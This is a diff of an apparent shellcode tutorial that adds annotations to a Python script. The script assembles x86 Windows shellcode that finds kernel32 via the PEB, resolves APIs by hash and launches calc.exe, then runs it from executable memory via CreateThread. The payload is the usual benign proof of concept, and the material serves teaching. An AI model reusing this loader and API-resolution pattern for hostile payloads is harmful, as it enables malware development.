@@ -37,168 +37,168 @@ The calculator-launching example is particularly valuable because it's benign ye
 Below is our complete x86 shellcode implementation with detailed annotations. Each section serves a specific purpose in our goal of launching the Windows calculator application without using standard library functions.
 
 ```python
-import ctypes, struct
-from keystone import *
+import ctypes, struct           # Import necessary modules for memory manipulation
+from keystone import *          # Import Keystone engine for assembling code
 
 CODE = (
-    " start:                             "
-    "   mov   ebp, esp                  ;"  # Stack base
-    "   add   esp, 0xfffff9f0           ;"  # ~1600 bytes (matches your working one)
-    " find_kernel32:                     "
-    "   xor   ecx, ecx                  ;"  # ECX = 0
-    "   mov   esi, fs:[ecx+0x30]        ;"  # ESI = PEB
-    "   mov   esi, [esi+0x0C]           ;"  # ESI = PEB->Ldr
-    "   mov   esi, [esi+0x1C]           ;"  # ESI = InInitOrder
-    " next_module:                       "
+    " start:                             "  # Beginning of shellcode
+    "   mov   ebp, esp                  ;"  # Stack base - save stack pointer in EBP register
+    "   add   esp, 0xfffff9f0           ;"  # ~1600 bytes of stack space (using negative value to avoid NULL bytes)
+    " find_kernel32:                     "  # Start of kernel32.dll location routine
+    "   xor   ecx, ecx                  ;"  # ECX = 0 (zero out register without using NULL bytes)
+    "   mov   esi, fs:[ecx+0x30]        ;"  # ESI = PEB (Process Environment Block via FS segment)
+    "   mov   esi, [esi+0x0C]           ;"  # ESI = PEB->Ldr (loader data)
+    "   mov   esi, [esi+0x1C]           ;"  # ESI = InInitOrder (module list in initialization order)
+    " next_module:                       "  # Loop marker for module iteration
     "   mov   ebx, [esi+0x08]           ;"  # EBX = module base (kernel32.dll)
-    "   mov   edi, [esi+0x20]           ;"  # EDI = module name
-    "   mov   esi, [esi]                ;"  # Next module
-    "   cmp   [edi+12*2], cx            ;"  # Check for kernel32.dll
-    "   jne   next_module               ;"
-    " find_function_shorten:             "
-    "   jmp find_function_shorten_bnc   ;"
-    " find_function_ret:                 "
-    "   pop esi                         ;"  # ESI = find_function address
-    "   mov   [ebp+0x04], esi           ;"  # Store for calls
-    "   jmp resolve_symbols_kernel32    ;"
-    " find_function_shorten_bnc:         "
-    "   call find_function_ret          ;"
-    " find_function:                     "
-    "   pushad                          ;"
-    "   mov   eax, [ebx+0x3c]           ;"
-    "   mov   edi, [ebx+eax+0x78]       ;"
-    "   add   edi, ebx                  ;"
-    "   mov   ecx, [edi+0x18]           ;"
-    "   mov   eax, [edi+0x20]           ;"
-    "   add   eax, ebx                  ;"
-    "   mov   [ebp-4], eax              ;"
-    " find_function_loop:                "
-    "   jecxz find_function_finished    ;"
-    "   dec   ecx                       ;"
-    "   mov   eax, [ebp-4]              ;"
-    "   mov   esi, [eax+ecx*4]          ;"
-    "   add   esi, ebx                  ;"
-    " compute_hash:                      "
-    "   xor   eax, eax                  ;"
-    "   cdq                             ;"
-    "   cld                             ;"
-    " compute_hash_again:                "
-    "   lodsb                           ;"
-    "   test  al, al                    ;"
-    "   jz    compute_hash_finished     ;"
-    "   ror   edx, 0x0d                 ;"
-    "   add   edx, eax                  ;"
-    "   jmp   compute_hash_again        ;"
-    " compute_hash_finished:             "
-    " find_function_compare:             "
-    "   cmp   edx, [esp+0x24]           ;"
-    "   jnz   find_function_loop        ;"
-    "   mov   edx, [edi+0x24]           ;"
-    "   add   edx, ebx                  ;"
-    "   mov   cx,  [edx+2*ecx]          ;"
-    "   mov   edx, [edi+0x1c]           ;"
-    "   add   edx, ebx                  ;"
-    "   mov   eax, [edx+4*ecx]          ;"
-    "   add   eax, ebx                  ;"
-    "   mov   [esp+0x1c], eax           ;"
-    " find_function_finished:            "
-    "   popad                           ;"
-    "   ret                             ;"
-    " resolve_symbols_kernel32:          "
-    "   push  0x78b5b983                ;"  # TerminateProcess hash (proven in your working shellcode)
-    "   call dword ptr [ebp+0x04]       ;"
-    "   mov   [ebp+0x10], eax           ;"  # Store TerminateProcess
-    "   push  0x16b3fe72                ;"  # CreateProcessA hash
-    "   call dword ptr [ebp+0x04]       ;"
-    "   mov   [ebp+0x18], eax           ;"  # Store CreateProcessA
-    " launch_calc:                       "
-    "   xor   eax, eax                  ;"
-    "   push  eax                       ;"  # Null terminator
-    "   push  0x6578652e                ;"  # ".exe"
-    "   push  0x636c6163                ;"  # "calc"
-    "   mov   ebx, esp                  ;"  # EBX = "calc.exe"
-    " create_startupinfoa:               "
-    "   xor   eax, eax                  ;"
-    "   push  eax                       ;"  # hStdError
-    "   push  eax                       ;"  # hStdOutput
-    "   push  eax                       ;"  # hStdInput
-    "   push  eax                       ;"  # lpReserved2
-    "   push  eax                       ;"  # cbReserved2 & wShowWindow
-    "   push  eax                       ;"  # dwFlags
-    "   push  eax                       ;"  # dwFillAttribute
-    "   push  eax                       ;"  # dwYCountChars
-    "   push  eax                       ;"  # dwXCountChars
-    "   push  eax                       ;"  # dwYSize
-    "   push  eax                       ;"  # dwXSize
-    "   push  eax                       ;"  # dwY
-    "   push  eax                       ;"  # dwX
-    "   push  eax                       ;"  # lpTitle
-    "   push  eax                       ;"  # lpDesktop
-    "   push  eax                       ;"  # lpReserved
-    "   mov   al, 0x44                  ;"  # cb = 68
-    "   push  eax                       ;"
-    "   push  esp                       ;"  # ESI = STARTUPINFOA
-    "   pop   esi                       ;"
-    " call_createprocessa:               "
-    "   mov   eax, esp                  ;"  # Current ESP
-    "   xor   ecx, ecx                  ;"
-    "   mov   cx, 0x390                 ;"  # 912 bytes
-    "   sub   eax, ecx                  ;"  # Adjust ESP safely
-    "   push  eax                       ;"  # lpProcessInformation
-    "   push  esi                       ;"  # lpStartupInfo
-    "   xor   eax, eax                  ;"
-    "   push  eax                       ;"  # lpCurrentDirectory
-    "   push  eax                       ;"  # lpEnvironment
-    "   push  eax                       ;"  # dwCreationFlags
-    "   inc   eax                       ;"  # EAX = 1
-    "   push  eax                       ;"  # bInheritHandles
-    "   dec   eax                       ;"  # EAX = 0
-    "   push  eax                       ;"  # lpThreadAttributes
-    "   push  eax                       ;"  # lpProcessAttributes
+    "   mov   edi, [esi+0x20]           ;"  # EDI = module name pointer
+    "   mov   esi, [esi]                ;"  # Next module in the linked list
+    "   cmp   [edi+12*2], cx            ;"  # Check for kernel32.dll (12th character position for NULL in Unicode)
+    "   jne   next_module               ;"  # If not kernel32.dll, continue to next module
+    " find_function_shorten:             "  # Beginning of function address resolution routine
+    "   jmp find_function_shorten_bnc   ;"  # Jump to call instruction (JMP/CALL/POP technique)
+    " find_function_ret:                 "  # Return address for the CALL instruction
+    "   pop esi                         ;"  # ESI = address of find_function routine (from CALL push)
+    "   mov   [ebp+0x04], esi           ;"  # Store find_function address for later calls
+    "   jmp resolve_symbols_kernel32    ;"  # Skip past the find_function code to resolution section
+    " find_function_shorten_bnc:         "  # Bouncer for the JMP/CALL/POP technique
+    "   call find_function_ret          ;"  # CALL pushes next instruction address to stack
+    " find_function:                     "  # Function to find API addresses by hash
+    "   pushad                          ;"  # Save all registers to stack
+    "   mov   eax, [ebx+0x3c]           ;"  # EAX = PE header offset (e_lfanew)
+    "   mov   edi, [ebx+eax+0x78]       ;"  # EDI = export table RVA
+    "   add   edi, ebx                  ;"  # Convert RVA to VA (virtual address)
+    "   mov   ecx, [edi+0x18]           ;"  # ECX = number of exported functions
+    "   mov   eax, [edi+0x20]           ;"  # EAX = RVA of function names array
+    "   add   eax, ebx                  ;"  # Convert names array RVA to VA
+    "   mov   [ebp-4], eax              ;"  # Cache function names array address
+    " find_function_loop:                "  # Loop through exported functions
+    "   jecxz find_function_finished    ;"  # If ECX=0 (no more functions), exit loop
+    "   dec   ecx                       ;"  # Decrement counter (loop from last to first)
+    "   mov   eax, [ebp-4]              ;"  # EAX = function names array address
+    "   mov   esi, [eax+ecx*4]          ;"  # ESI = RVA of current function name
+    "   add   esi, ebx                  ;"  # Convert function name RVA to VA
+    " compute_hash:                      "  # Begin hash calculation for function name
+    "   xor   eax, eax                  ;"  # Clear EAX for character loading
+    "   cdq                             ;"  # Clear EDX (extend sign bit of EAX to EDX) for hash value
+    "   cld                             ;"  # Clear direction flag (ensure string ops move forward)
+    " compute_hash_again:                "  # Hash calculation loop
+    "   lodsb                           ;"  # Load next character from ESI into AL
+    "   test  al, al                    ;"  # Check if character is NULL (end of string)
+    "   jz    compute_hash_finished     ;"  # If NULL, hash calculation complete
+    "   ror   edx, 0x0d                 ;"  # Rotate right hash value by 13 bits
+    "   add   edx, eax                  ;"  # Add character value to hash
+    "   jmp   compute_hash_again        ;"  # Process next character
+    " compute_hash_finished:             "  # Hash calculation complete
+    " find_function_compare:             "  # Compare calculated hash with target
+    "   cmp   edx, [esp+0x24]           ;"  # Compare hash with argument (pushed before PUSHAD)
+    "   jnz   find_function_loop        ;"  # If no match, try next function
+    "   mov   edx, [edi+0x24]           ;"  # EDX = RVA of ordinals table
+    "   add   edx, ebx                  ;"  # Convert ordinals RVA to VA
+    "   mov   cx,  [edx+2*ecx]          ;"  # CX = function ordinal
+    "   mov   edx, [edi+0x1c]           ;"  # EDX = RVA of function addresses table
+    "   add   edx, ebx                  ;"  # Convert addresses RVA to VA
+    "   mov   eax, [edx+4*ecx]          ;"  # EAX = RVA of function
+    "   add   eax, ebx                  ;"  # Convert function RVA to VA
+    "   mov   [esp+0x1c], eax           ;"  # Overwrite EAX in saved registers (via PUSHAD)
+    " find_function_finished:            "  # Function resolution complete
+    "   popad                           ;"  # Restore registers (with EAX = function address)
+    "   ret                             ;"  # Return to caller
+    " resolve_symbols_kernel32:          "  # Begin resolving specific API functions
+    "   push  0x78b5b983                ;"  # Push TerminateProcess hash
+    "   call dword ptr [ebp+0x04]       ;"  # Call find_function to resolve address
+    "   mov   [ebp+0x10], eax           ;"  # Store TerminateProcess address
+    "   push  0x16b3fe72                ;"  # Push CreateProcessA hash
+    "   call dword ptr [ebp+0x04]       ;"  # Call find_function to resolve address
+    "   mov   [ebp+0x18], eax           ;"  # Store CreateProcessA address
+    " launch_calc:                       "  # Begin calculator launching routine
+    "   xor   eax, eax                  ;"  # Clear EAX for NULL terminator
+    "   push  eax                       ;"  # Push NULL terminator for string
+    "   push  0x6578652e                ;"  # Push ".exe" (in reverse byte order)
+    "   push  0x636c6163                ;"  # Push "calc" (in reverse byte order)
+    "   mov   ebx, esp                  ;"  # EBX = pointer to "calc.exe" string
+    " create_startupinfoa:               "  # Begin creating STARTUPINFO structure
+    "   xor   eax, eax                  ;"  # Clear EAX for multiple zero values
+    "   push  eax                       ;"  # hStdError = NULL
+    "   push  eax                       ;"  # hStdOutput = NULL
+    "   push  eax                       ;"  # hStdInput = NULL
+    "   push  eax                       ;"  # lpReserved2 = NULL
+    "   push  eax                       ;"  # cbReserved2 & wShowWindow = 0
+    "   push  eax                       ;"  # dwFlags = 0
+    "   push  eax                       ;"  # dwFillAttribute = 0
+    "   push  eax                       ;"  # dwYCountChars = 0
+    "   push  eax                       ;"  # dwXCountChars = 0
+    "   push  eax                       ;"  # dwYSize = 0
+    "   push  eax                       ;"  # dwXSize = 0
+    "   push  eax                       ;"  # dwY = 0
+    "   push  eax                       ;"  # dwX = 0
+    "   push  eax                       ;"  # lpTitle = NULL
+    "   push  eax                       ;"  # lpDesktop = NULL
+    "   push  eax                       ;"  # lpReserved = NULL
+    "   mov   al, 0x44                  ;"  # AL = 68 (size of STARTUPINFO structure)
+    "   push  eax                       ;"  # cb = 68 (first field of STARTUPINFO)
+    "   push  esp                       ;"  # Push pointer to STARTUPINFO
+    "   pop   esi                       ;"  # ESI = pointer to STARTUPINFO
+    " call_createprocessa:               "  # Prepare for CreateProcessA call
+    "   mov   eax, esp                  ;"  # Get current stack pointer
+    "   xor   ecx, ecx                  ;"  # Clear ECX for stack space calculation
+    "   mov   cx, 0x390                 ;"  # ECX = 912 bytes (space for PROCESS_INFORMATION)
+    "   sub   eax, ecx                  ;"  # EAX = location for PROCESS_INFORMATION
+    "   push  eax                       ;"  # lpProcessInformation parameter
+    "   push  esi                       ;"  # lpStartupInfo parameter
+    "   xor   eax, eax                  ;"  # Clear EAX for NULL values
+    "   push  eax                       ;"  # lpCurrentDirectory = NULL
+    "   push  eax                       ;"  # lpEnvironment = NULL
+    "   push  eax                       ;"  # dwCreationFlags = 0
+    "   inc   eax                       ;"  # EAX = 1 (avoid NULL byte)
+    "   push  eax                       ;"  # bInheritHandles = TRUE
+    "   dec   eax                       ;"  # EAX = 0 again
+    "   push  eax                       ;"  # lpThreadAttributes = NULL
+    "   push  eax                       ;"  # lpProcessAttributes = NULL
     "   push  ebx                       ;"  # lpCommandLine = "calc.exe"
-    "   push  eax                       ;"  # lpApplicationName
-    "   call  dword ptr [ebp+0x18]      ;"  # CreateProcessA
-    " exit_properly:                     "
-    "   xor   ecx, ecx                  ;"
+    "   push  eax                       ;"  # lpApplicationName = NULL
+    "   call  dword ptr [ebp+0x18]      ;"  # Call CreateProcessA
+    " exit_properly:                     "  # Clean exit routine
+    "   xor   ecx, ecx                  ;"  # Clear ECX for exit code
     "   push  ecx                       ;"  # uExitCode = 0
     "   push  0xffffffff                ;"  # hProcess = -1 (current process)
-    "   call  dword ptr [ebp+0x10]      ;"  # TerminateProcess
+    "   call  dword ptr [ebp+0x10]      ;"  # Call TerminateProcess
 )
 
-ks = Ks(KS_ARCH_X86, KS_MODE_32)
-encoding, count = ks.asm(CODE)
-print("Encoded %d instructions..." % count)
+ks = Ks(KS_ARCH_X86, KS_MODE_32)        # Initialize Keystone assembler for x86 32-bit
+encoding, count = ks.asm(CODE)          # Assemble the shellcode into machine code
+print("Encoded %d instructions..." % count)  # Display count of assembled instructions
 
-sh = b""
-for e in encoding:
-    sh += struct.pack("B", e)
-shellcode = bytearray(sh)
+sh = b""                                # Initialize empty binary string
+for e in encoding:                      # Loop through each byte of encoded shellcode
+    sh += struct.pack("B", e)           # Pack byte into binary string
+shellcode = bytearray(sh)               # Convert to bytearray for memory operations
 
-ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
-                                          ctypes.c_int(len(shellcode)),
-                                          ctypes.c_int(0x3000),
-                                          ctypes.c_int(0x40))
+ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),                    # Allocate memory at NULL (OS chooses address)
+                                          ctypes.c_int(len(shellcode)),        # Size of allocated memory equals shellcode size
+                                          ctypes.c_int(0x3000),                # MEM_COMMIT | MEM_RESERVE 
+                                          ctypes.c_int(0x40))                  # PAGE_EXECUTE_READWRITE protection
 
-if not ptr:
-    raise Exception("VirtualAlloc failed")
+if not ptr:                             # Check if memory allocation failed
+    raise Exception("VirtualAlloc failed")  # Raise exception if allocation failed
 
-buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)  # Create C-compatible buffer from shellcode
 
-ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
-                                     buf,
-                                     ctypes.c_int(len(shellcode)))
+ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),        # Copy shellcode to allocated memory
+                                     buf,                       # Source buffer
+                                     ctypes.c_int(len(shellcode)))  # Length to copy
 
-print("Shellcode located at address %s" % hex(ptr))
-input("...ENTER TO EXECUTE SHELLCODE...")
+print("Shellcode located at address %s" % hex(ptr))  # Display shellcode memory address
+input("...ENTER TO EXECUTE SHELLCODE...")  # Wait for user confirmation
 
-ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
-                                         ctypes.c_int(0),
-                                         ctypes.c_int(ptr),
-                                         ctypes.c_int(0),
-                                         ctypes.c_int(0),
-                                         ctypes.pointer(ctypes.c_int(0)))
+ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),        # Default security attributes
+                                         ctypes.c_int(0),        # Default stack size
+                                         ctypes.c_int(ptr),      # Thread start address (shellcode)
+                                         ctypes.c_int(0),        # No thread parameters
+                                         ctypes.c_int(0),        # Run thread immediately
+                                         ctypes.pointer(ctypes.c_int(0)))  # Don't return thread identifier
 
-ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
+ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))  # Wait indefinitely for thread to finish
 ```
 
 Now, let's analyze this code in depth to understand how each component works.
